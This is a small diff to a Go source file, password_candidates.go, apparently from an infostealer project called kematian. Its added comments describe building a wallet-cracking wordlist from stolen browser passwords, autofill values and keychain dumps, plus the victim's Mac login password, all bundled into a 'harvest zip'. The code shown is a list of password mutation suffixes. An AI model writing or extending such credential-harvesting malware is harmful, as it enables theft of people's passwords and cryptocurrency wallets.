@@ -1,3 +1,8 @@
+// password_candidates.go — builds a deduplicated password wordlist for wallets.
+//
+// Sources: browser saved passwords, autofill values, keychain dumps, plus light
+// mutations (common suffixes/years). Capped at maxPasswordCandidates so the
+// harvest zip stays small; the Mac login password is added by cmd/kematian.
 package scanner
 
 import (
@@ -13,6 +18,7 @@ const (
 	minPasswordLen        = 1
 )
 
+// mutationSuffixes are cheap variants appended to base passwords (e.g. "pass" → "pass123").
 var mutationSuffixes = []string{
 	"", "1", "!", "123", "1234", "@", "#", "1!", "!1", "01",
 	"2024", "2025", "2026", "2027",
